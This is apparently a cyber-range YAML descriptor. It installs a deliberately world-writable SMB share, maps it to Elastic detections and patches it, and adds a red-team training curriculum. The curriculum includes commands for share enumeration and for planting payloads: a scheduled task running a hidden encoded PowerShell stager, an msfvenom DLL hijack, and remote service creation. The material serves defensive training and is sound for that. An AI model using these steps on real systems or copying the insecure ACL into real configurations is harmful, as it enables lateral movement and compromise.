# Bolt-on: Writable SMB Share — Everyone:Full
# --------------------------------------------
# Install creates C:\PublicShare on a member server, exposes it as the SMB
# share `PublicShare`, grants Everyone:Full at the share level, and sets
# NTFS perms to Everyone:Modify. Any authenticated user (or anonymous
# guest, if guest is enabled — left to a separate bolt-on) can drop files
# anywhere in the share. Combined with scheduled-task XML drops, startup
# folder writes from impersonated user, or DLL planting, this is a generic
# lateral-movement surface.
#
# Patch reduces share + NTFS perms to Administrators:Full, removes
# Everyone, and audit-flags subsequent ACL changes.
#
# Elastic rule UUIDs sampled from:
#   Research/elastic-detection-rules/rules/windows/lateral_movement_remote_file_copy_hidden_share.toml
#   Research/elastic-detection-rules/rules/windows/lateral_movement_execution_via_file_shares_sequence.toml
#   Research/elastic-detection-rules/rules/windows/lateral_movement_mount_hidden_or_webdav_share_net.toml

id: bolton.service-misconfig.writable-share-everyone
slug: writable-share-everyone
name: "Writable SMB Share — Everyone:Full"
version: "1.0.0"
author: "Red Team Infra"
last_updated: 2026-05-19

category: service-misconfig
subcategory: smb-share
tags:
  - smb
  - share-permissions
  - lateral-movement
  - everyone
  - writable
description: >
  Creates a wide-open SMB share `PublicShare` on a member server, backed
  by C:\PublicShare. Share-level ACL: Everyone has Full Control. NTFS
  ACL: Everyone:Modify. Any authenticated principal (including the
  Domain Users group via the implicit "Authenticated Users" of Everyone)
  can read, write, modify, and delete arbitrary files. The descriptor's
  primary use is as a lateral-movement landing pad for operator training
  (drop a scheduled-task XML, a startup-folder shortcut, or a DLL planted
  next to a search-path-vulnerable host EXE).

cve: []
references:
  - "https://attack.mitre.org/techniques/T1021/002/"
  - "https://attack.mitre.org/techniques/T1136/"
  - "https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview"
  - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-006a"

mitre:
  tactic:
    id: TA0008
    name: "Lateral Movement"
  technique:
    id: T1021
    name: "Remote Services"
  subtechnique:
    id: T1021.002
    name: "SMB/Windows Admin Shares"
  notes: >
    The misconfig itself is closer to T1136 (Create Account) when paired
    with a write-Run-key payload; T1021.002 captures the lateral-movement
    primitive the share enables. Operator-training scenarios usually
    walk a chain: write payload to share -> trigger remote execution via
    schtask/wmic/PsExec.

detection:
  coverage_status: covered
  elastic_rules:
    - rule_uuid: "fa01341d-6662-426b-9d0c-6d81e33c8a9d"
      rule_name: "Remote File Copy to a Hidden Share"
      rule_filename: "windows/lateral_movement_remote_file_copy_hidden_share.toml"
      coverage: partial
      confidence: medium
      last_validated: 2026-04-15
      notes: "Detects write activity to admin shares (C$/ADMIN$); generic writable shares share much of the same telemetry."
    - rule_uuid: "ab75c24b-2502-43a0-bf7c-e60e662c811e"
      rule_name: "Remote Execution via File Shares"
      rule_filename: "windows/lateral_movement_execution_via_file_shares_sequence.toml"
      coverage: full
      confidence: high
      last_validated: 2026-04-15
      notes: "Catches the canonical SMB write -> remote execute chain — exactly the bolt-on's purpose."
    - rule_uuid: "c4210e1c-64f2-4f48-b67e-b5a8ffe3aa14"
      rule_name: "Mounting Hidden or WebDav Remote Shares"
      rule_filename: "windows/lateral_movement_mount_hidden_or_webdav_share_net.toml"
      coverage: indirect
      confidence: low
      last_validated: 2026-04-15
      notes: "Fires on net use / New-PSDrive to suspicious shares — partial overlap with adversary recon of the writable share."
  signal_sources:
    - "Windows Event 5142 (network share created)"
    - "Windows Event 5145 (network share object accessed — file create / write)"
    - "Sysmon Event 11 (FileCreate) under C:\\PublicShare from a remote user"
    - "Windows Event 4663 (SACL — Write Data on \\\\<host>\\PublicShare)"
    - "Sysmon Event 1 — process create child of services.exe right after a Scheduled-Tasks XML drop"

targets:
  supported_os:
    - family: windows
      min_version: "2016"
      max_version: "2025"
      edition_in: ["Datacenter", "Standard"]
  required_roles:
    - member_server
  required_services:
    - smb
  required_domain_function_level: null

depends_on: []
conflicts_with: []

side_effects:
  global: false
  network_visible: true
  reboot_required: false

install:
  estimated_time_seconds: 30
  steps:
    - ansible_role: ansible.windows.win_file
      description: "Create the backing directory."
      role_vars:
        path: 'C:\PublicShare'
        state: directory
    - ansible_role: ansible.windows.win_share
      description: "Create the SMB share with Everyone:Full at the share level."
      role_vars:
        name: PublicShare
        path: 'C:\PublicShare'
        full: "Everyone"
        description: "Lab bolt-on writable share — DO NOT USE IN PROD"
        state: present
    - ansible_role: ansible.windows.win_acl
      description: "Grant NTFS Modify rights to Everyone on the backing folder."
      role_vars:
        path: 'C:\PublicShare'
        user: "Everyone"
        rights: "Modify"
        type: allow
        inherit: "ContainerInherit,ObjectInherit"
        propagation: "None"
        state: present
  verify:
    probe: |
      $share = Get-SmbShare -Name 'PublicShare' -ErrorAction SilentlyContinue
      $shareAcl = Get-SmbShareAccess -Name 'PublicShare' -ErrorAction SilentlyContinue |
        Where-Object { $_.AccountName -eq 'Everyone' -and $_.AccessRight -eq 'Full' }
      if ($share -and $shareAcl) { exit 0 } else { exit 1 }
    timeout_seconds: 30
    expect_exit_code: 0

uninstall:
  description: "Remove the SMB share and delete the backing directory + ACL state."
  estimated_time_seconds: 30
  steps:
    - ansible_role: ansible.windows.win_share
      description: "Remove the share."
      role_vars:
        name: PublicShare
        state: absent
    - ansible_role: ansible.windows.win_file
      description: "Delete the backing directory tree."
      role_vars:
        path: 'C:\PublicShare'
        state: absent
  verify:
    probe: |
      $share = Get-SmbShare -Name 'PublicShare' -ErrorAction SilentlyContinue
      if (-not $share -and -not (Test-Path 'C:\PublicShare')) { exit 0 } else { exit 1 }
    timeout_seconds: 30
    expect_exit_code: 0

patch:
  description: >
    Tighten share + NTFS permissions to Administrators-only and audit
    all subsequent ACL changes. Replaces share-level Everyone:Full with
    Administrators:Full + Authenticated Users:Read. Removes Everyone
    from the NTFS ACL entirely; grants Administrators:FullControl with
    inherited propagation. Sets a SACL on the directory to audit Write
    Data + Change Permissions writes by anyone.
  patch_reference:
    - "https://www.cisecurity.org/benchmark/microsoft_windows_server"
    - "https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview"
    - "https://attack.mitre.org/mitigations/M1027/"
  complexity: low
  side_effects:
    - "Share-level ACL: Everyone removed, Administrators:Full + Authenticated Users:Read added"
    - "NTFS ACL: Everyone removed, Administrators:FullControl with inheritance"
    - "Audit SACL on C:\\PublicShare — Write Data + Change Permissions audited for Everyone"
    - "Existing user-owned files retain their ownership but are no longer writable by non-admins"
  rollback_supported: true
  steps:
    - ansible_role: ansible.windows.win_share
      description: "Replace share-level ACL with Administrators:Full + AuthenticatedUsers:Read."
      role_vars:
        name: PublicShare
        path: 'C:\PublicShare'
        full: "Administrators"
        read: "Authenticated Users"
        state: present
    - ansible_role: ansible.windows.win_acl
      description: "Remove the Everyone ACE from the backing folder."
      role_vars:
        path: 'C:\PublicShare'
        user: "Everyone"
        rights: "Modify"
        type: allow
        state: absent
    - ansible_role: ansible.windows.win_acl
      description: "Grant Administrators FullControl with inheritance."
      role_vars:
        path: 'C:\PublicShare'
        user: "Administrators"
        rights: "FullControl"
        type: allow
        inherit: "ContainerInherit,ObjectInherit"
        propagation: "None"
        state: present
    - ansible_role: community.windows.win_powershell
      description: "Add audit SACL — Write Data and Change Permissions by Everyone."
      role_vars:
        script: |
          $path = 'C:\PublicShare'
          $acl  = Get-Acl -Path $path -Audit
          $rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone",
            "WriteData,ChangePermissions",
            "ContainerInherit,ObjectInherit",
            "None",
            "Success,Failure")
          $acl.AddAuditRule($rule)
          Set-Acl -Path $path -AclObject $acl
  verify:
    probe: |
      $shareAcl = Get-SmbShareAccess -Name 'PublicShare' |
        Where-Object { $_.AccountName -eq 'Everyone' -and $_.AccessRight -eq 'Full' }
      $ntfsEveryone = (Get-Acl 'C:\PublicShare').Access |
        Where-Object { $_.IdentityReference.Value -eq 'Everyone' -and $_.FileSystemRights -match 'Modify|FullControl' }
      if (-not $shareAcl -and -not $ntfsEveryone) { exit 0 } else { exit 1 }
    timeout_seconds: 60
    expect_exit_code: 0
  exploit_probe_after_patch: "webapp/bolton/exploit_probes/writable_share_check.sh"

patch_revert:
  description: "Re-grant Everyone:Full at share + NTFS layers — share is writable again."
  estimated_time_seconds: 30
  steps:
    - ansible_role: ansible.windows.win_share
      description: "Restore Everyone:Full share-level ACL."
      role_vars:
        name: PublicShare
        path: 'C:\PublicShare'
        full: "Everyone"
        state: present
    - ansible_role: ansible.windows.win_acl
      description: "Re-grant Everyone:Modify on NTFS."
      role_vars:
        path: 'C:\PublicShare'
        user: "Everyone"
        rights: "Modify"
        type: allow
        inherit: "ContainerInherit,ObjectInherit"
        propagation: "None"
        state: present
  verify:
    probe: |
      $shareAcl = Get-SmbShareAccess -Name 'PublicShare' |
        Where-Object { $_.AccountName -eq 'Everyone' -and $_.AccessRight -eq 'Full' }
      if ($shareAcl) { exit 0 } else { exit 1 }
    timeout_seconds: 30
    expect_exit_code: 0
  warning: "PublicShare is world-writable again. Any Domain User can drop scheduled-task XMLs or planted DLLs."

cost:
  storage_mb: 5
  cpu_pct: 0
  detectability: medium

curriculum:
  title: "Writable SMB Share — Lateral movement landing pad"
  summary: >
    Guided walkthrough of an Everyone-writable SMB share on tlms01. You
    will enumerate shares using smbmap, crackmapexec, PowerView's
    Find-DomainShare, and a CS BOF; write a payload to the share; trigger
    remote execution via scheduled task or DLL hijack; and walk the
    Elastic detections that fire on the write+execute chain.
  learning_objectives:
    - "Enumerate SMB shares and their effective permissions from Linux and Windows attacker contexts."
    - "Distinguish share-level ACLs from NTFS DACLs (both must allow access)."
    - "Plant a payload on a writable share and trigger execution via three independent vectors (schtask XML, DLL search-order hijack, Startup folder)."
    - "Map writable-share telemetry to the canonical lateral-movement Elastic detections."
  prerequisites:
    - "Beacon on tlws01 as TESTLAB\\jdoe (low-priv domain user)"
    - "Kali at 192.168.1.100 with smbmap, crackmapexec, and Impacket installed"
    - "writable-share-everyone bolt-on installed on tlms01 (PublicShare exposed)"
  estimated_total_minutes: 35
  steps:
    - id: "01-enum-from-linux"
      title: "Enumerate writable shares from Kali"
      estimated_minutes: 5
      markdown: |
        ## Step 1 — Find the share + confirm effective permissions

        Two distinct ACLs need to align for write access:

        1. **Share-level ACL** (SMB-layer, set via `Grant-SmbShareAccess`)
        2. **NTFS DACL** on the backing folder

        Both must permit your principal. Enumerate from Kali as
        TESTLAB\jdoe:

        ```bash
        # smbmap — fastest share+permission view
        smbmap -H 10.99.50.11 -u jdoe -p 'Welcome1!' -d testlab.local
        # Expected:
        # Disk          Permissions   Comment
        # ----          -----------   -------
        # ADMIN$        NO ACCESS     Remote Admin
        # C$            NO ACCESS     Default share
        # IPC$          READ ONLY     Remote IPC
        # NETLOGON      READ ONLY     Logon server share
        # PublicShare   READ, WRITE   Lab bolt-on writable share — DO NOT USE IN PROD
        # SYSVOL        READ ONLY     Logon server share
        ```

        ```bash
        # crackmapexec / netexec — bulk share enumeration across a subnet
        netexec smb 10.99.50.0/24 -u jdoe -p 'Welcome1!' -d testlab.local --shares
        # Returns every host's share list + per-share R/W flag
        ```

        ```bash
        # List share contents to confirm read works
        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' -c "ls"
        ```

        > **Detection callout** — Share enumeration via SMB is mostly
        > below detection threshold (legitimate users enumerate shares
        > all day). EID 5140 (network share accessed) fires but is
        > normally tuned out.
    - id: "02-enum-from-windows"
      title: "PowerView and CS BOF from inside the network"
      estimated_minutes: 5
      markdown: |
        ## Step 2 — Enumerate from the tlws01 beacon

        From the beacon, three independent paths to the same data.

        ### PowerView

        ```powershell
        Import-Module .\PowerView.ps1
        Find-DomainShare -ComputerName tlms01.testlab.local -CheckShareAccess
        # CheckShareAccess filters to shares the current user can READ
        ```

        ```powershell
        # Domain-wide writable-share hunt
        Find-DomainShare -CheckShareAccess |
          Where-Object { $_.Type -eq 0 }   # Disk shares only, exclude IPC$/print
        ```

        ### CS BOF — `findshares.x64.o`

        ```
        beacon> inline-execute /opt/bofs/findshares.x64.o tlms01.testlab.local
        [+] \\tlms01.testlab.local\PublicShare  (DISKTREE)  - "Lab bolt-on writable share"
        [+] \\tlms01.testlab.local\NETLOGON     (DISKTREE)
        ```

        ### Native net.exe

        ```cmd
        net view \\tlms01.testlab.local
        net use Z: \\tlms01.testlab.local\PublicShare
        dir Z:\
        ```

        > **Detection callout** — *Suspicious PowerShell ScriptBlock —
        > PowerView Loaded* (EID 4104) fires when `Find-DomainShare` or
        > other PowerView functions execute. The BOF variant avoids this.
    - id: "03-plant-payload-vectors"
      title: "Plant payloads — three execution vectors"
      estimated_minutes: 12
      markdown: |
        ## Step 3 — Plant + trigger lateral movement

        Three independent execution vectors. Pick whichever matches the
        target environment.

        ### Vector A — Scheduled Task XML drop (T1053.005)

        Create a task XML on Kali:

        ```bash
        cat > /tmp/PublicTask.xml <<'XML'
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <Triggers>
            <TimeTrigger>
              <StartBoundary>2026-05-28T12:00:00</StartBoundary>
              <Enabled>true</Enabled>
            </TimeTrigger>
          </Triggers>
          <Principals>
            <Principal id="Author">
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Actions Context="Author">
            <Exec>
              <Command>powershell.exe</Command>
              <Arguments>-NoP -W Hidden -Enc &lt;base64-stager&gt;</Arguments>
            </Exec>
          </Actions>
        </Task>
        XML

        # Drop on share + register on tlms01 via schtasks
        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
            -c "put /tmp/PublicTask.xml PublicTask.xml"

        # Then from the beacon on tlws01 (must have CreateTask rights on tlms01):
        # schtasks /create /S tlms01 /XML \\tlms01\PublicShare\PublicTask.xml /TN MyTask /F
        ```

        ### Vector B — DLL search-order hijack

        If a service or app on tlms01 loads DLLs without a fully-qualified
        path and walks the search order through the writable share (rare
        but seen with custom apps + UNC working directories):

        ```bash
        # Build the DLL on Kali
        msfvenom -p windows/x64/exec CMD='powershell -Enc <stager>' \
            -f dll -o /tmp/version.dll
        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
            -c "put /tmp/version.dll version.dll"
        ```

        ### Vector C — User-startup folder write (T1547.001)

        If the share happens to be (or contains) a user's Startup folder
        (unusual default, common in roaming-profile setups):

        ```bash
        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
            -c "put /tmp/run_on_login.lnk Reports/run_on_login.lnk"
        ```

        Fires on next interactive logon by any user whose Startup links
        resolve from that share.

        ### Vector D — CS BOF: write-execute from beacon

        ```
        beacon> upload /tmp/payload.exe
        beacon> shell copy beacon-out\payload.exe \\tlms01.testlab.local\PublicShare\update.exe
        beacon> shell sc \\tlms01 create LabUpdater binPath= "\\tlms01\PublicShare\update.exe"
        beacon> shell sc \\tlms01 start LabUpdater
        ```

        > **Detection callout** — *Remote Execution via File Shares*
        > (`ab75c24b-2502-43a0-bf7c-e60e662c811e`) is purpose-built for
        > this exact write-then-execute sequence. It correlates a remote
        > file write (EID 5145 on the share) with a subsequent service or
        > task creation on the same host within a short window.
      assessment:
        question: "Vector A (schtask XML drop) requires a *separate* primitive to register the task remotely. Why isn't dropping the XML on the share enough?"
        options:
          - "Windows Task Scheduler doesn't auto-import XML files from arbitrary disk locations — it requires schtasks /create or a registry write under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks. Both need a separate execution primitive."
          - "The XML is encrypted on disk."
          - "Task Scheduler only reads from C:\\Windows\\System32\\Tasks."
          - "Tasks require admin to even drop the XML."
        correct_index: 0
        explanation: >
          Dropping XML on a share creates a file, nothing more. Windows
          imports tasks via the Task Scheduler service API (schtasks.exe
          /create /XML, or PowerShell Register-ScheduledTask, or a write
          to the protected TaskCache registry path which itself requires
          SYSTEM). The share is the staging ground; you need a separate
          remote-execution primitive (WMI, schtasks /S, PsExec, etc.) to
          turn the dropped XML into a registered task.
    - id: "04-detection-and-patch"
      title: "Detection mapping + patch"
      estimated_minutes: 7
      markdown: |
        ## Step 4 — What the SOC sees + harden

        Open Kibana (https://10.99.50.13:5601), filter `host.name :
        tlms01` for the past hour. Expected hits from Steps 3.A and 3.D:

        | Phase | Rule | Source event |
        |---|---|---|
        | Share creation | Windows Event 5142 — network share created | bolt-on install |
        | Write to share | Sysmon EID 11 — FileCreate under C:\PublicShare from remote user | Steps 3.A/B/C/D |
        | Write+execute  | Remote Execution via File Shares | sequence rule: 5145 write + 4697 service install OR 4698 task create |
        | Task registered | Suspicious Scheduled Task Created (built-in) | EID 4698 |

        The single highest-fidelity signal is the **sequence rule** —
        independent file-writes are noisy on prod file servers, but a
        write immediately followed by a service/task creation referencing
        the written path is extremely high-confidence lateral movement.

        **Mitigation** — click **Patch**. The patch:

        1. Replaces share-level Everyone:Full with Administrators:Full +
           Authenticated Users:Read
        2. Removes the NTFS Everyone:Modify ACE
        3. Grants Administrators FullControl with inheritance
        4. Adds an audit SACL on `C:\PublicShare` for WriteData +
           ChangePermissions by anyone (Success+Failure)

        Verify:

        ```powershell
        Get-SmbShareAccess -Name 'PublicShare'
        # Expected:
        # Name        AccountName            AccessControlType  AccessRight
        # ----        -----------            -----------------  -----------
        # PublicShare BUILTIN\Administrators Allow              Full
        # PublicShare NT AUTHORITY\Authenticated Users  Allow   Read

        (Get-Acl 'C:\PublicShare').Access | Format-Table IdentityReference, FileSystemRights
        # No "Everyone" line should appear with Modify or higher
        ```

        Re-run Step 3.A's `smbclient put`:

        ```
        $ smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
            -c "put /tmp/test.txt test.txt"
        NT_STATUS_ACCESS_DENIED opening remote file \test.txt
        ```

        Share is now read-only for non-admins; lateral landing pad closed.

        ### Defensive guidance for the org

        - Run `Get-SmbShare | Get-SmbShareAccess | Where-Object {
          $_.AccountName -eq 'Everyone' }` across every member server
        - Replace Everyone with Authenticated Users at minimum; reserve
          Full Control for Administrators
        - Audit SACLs on every share that legitimately needs writable
          access (e.g. Reports drops, deploy stagers)
        - Pair with the smb-signing bolt-on so cross-host SMB sessions
          can't be hijacked even if write is permitted
      assessment:
        question: "Why does the patch keep Authenticated Users:Read at the share level instead of removing Everyone entirely with no replacement?"
        options:
          - "Removing all non-admin access would break the legitimate Reports drop workflow the share exists for. Authenticated Users:Read lets the team continue to consume reports while removing the lateral-movement primitive (write access). Apply least privilege — don't lock out users who have a legitimate need."
          - "Windows requires at least one non-admin ACE on every share."
          - "Authenticated Users is an alias for Administrators."
          - "It's a Microsoft licensing requirement."
        correct_index: 0
        explanation: >
          Patches that over-tighten get reverted by the team that owns
          the workflow. The right fix is least privilege: identify
          what the share legitimately needs (read for the team) and
          remove what it doesn't (write for everyone). Read-only access
          for Authenticated Users + audit SACL on writes catches both
          intended-use reads AND any attempt at the old lateral-movement
          primitive, all without breaking the business workflow.

status: stable
